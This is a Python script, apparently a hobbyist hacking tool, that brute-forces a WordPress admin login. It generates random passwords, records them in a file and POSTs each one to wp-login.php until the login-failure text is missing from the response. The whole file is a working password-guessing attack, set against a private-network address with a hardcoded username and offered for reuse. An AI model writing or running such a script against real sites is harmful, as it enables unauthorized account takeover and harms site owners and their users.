import string
import random
from turtle import st
from urllib import response
import requests
from rx import generate
from colorama import Fore
import os


'''
Coded by MiamiHacker, 'code is on https://github.com/MiamiHacker' 
You want to see how it works?
https://twitter.com/miami_hacker/status/1530586654649593861?s=20&t=YMntpVom5aF_KeYpWXYGEA
'''

# Select url in terminal or in the script like now
# url = input('[+] Enter the page URL: ')
url = "http://192.168.2.7/wp-login.php?"

# change the username to admin or anything else or set target in terminal
# username = input('[+] Enter username for the BruteForce: ')
username = 'hunter'
login_failed_string = 'Lost your password?'


## characters to generate password from
alphabets = list(string.ascii_letters)
digits = list(string.digits)
special_characters = list("!@#$%^&*()")
characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")

i = 0
j = 0

# 10000 or what you like | while True keeps running till BruteForce is done.
while j < 10000:
# while True:

    i += 1
    j += 1
    # Give a password length or use the random
    length = 2 
    # random_list = (5, 6, 7, 8, 9, 10, 11, 12)
    # length = random.choice(random_list)
    alphabets_count = 2
    digits_count = 0
    special_characters_count = 0
    characters_count = alphabets_count + digits_count + special_characters_count
    if characters_count > length:
        print("Characters total count is greater than the password length")

    ## initializing the password
    password = []

    ## picking random alphabets
    for i in range(alphabets_count):
        password.append(random.choice(alphabets))

    ## picking random digits
    for i in range(digits_count):
        password.append(random.choice(digits))

    ## picking random special characters
    for i in range(special_characters_count):
        password.append(random.choice(special_characters))

    ## if characters count is less than the password length
    ## add random characters to make it equal to the password length
    if characters_count < length:
        random.shuffle(characters)
        for i in range(length - characters_count):
            password.append(random.choice(characters))

    ## shuffling the password again
    random.shuffle(password)
    my_password_list = ("".join(password))
    #time.sleep(0.1)
    
    value = my_password_list
    with open("pass.txt", "a+") as file:
        file.seek(0) # set position to start of file
        lines = file.read().splitlines() # now we won't have those newlines
        if value in lines:
            # print(Fore.WHITE, "[ LOG :",(j),"]", " PassWord:", Fore.GREEN, (my_bruteforce_password), Fore.WHITE, " exists in file", Fore.RESET)
            pass
        else:
            # write to file
            wr_value = value
            file.write(wr_value + "\n") # in append mode writes will always go to the end, so no need to seek() here
            my_bruteforce_password = wr_value
            # data to post
            data = {'log':username,'pwd':my_bruteforce_password,'Login':'wp-submit'}
            # BruteForce in a post request 
            response = requests.post(url, data=data)
            # Log of the pass and user on url target
            print(Fore.WHITE, "[ LOG :",(j),"]", Fore.YELLOW, "New PassWord Generated:", Fore.GREEN, (my_bruteforce_password), Fore.WHITE, "Trying user", Fore.GREEN, username, Fore.WHITE, "and password", Fore.GREEN, my_bruteforce_password, Fore.WHITE, "on", url, Fore.RESET)

            # LOG: important check for dev mode to catch bugs
            # if my_bruteforce_password == 'iQ':
            #     print(Fore.RED + "FAILED - FAILED - FAILED - FAILED")
            if login_failed_string in response.content.decode():
                # LOG: important check for dev mode to catch bugs
                # print("              Get Warning")
                pass
            else:
                print('Found user', Fore.GREEN, username, Fore.RESET)
                print('Found pass', Fore.GREEN, my_bruteforce_password, Fore.RESET)
                os.remove('pass.txt')
                exit()
else:
    print("Out of while loop!!")
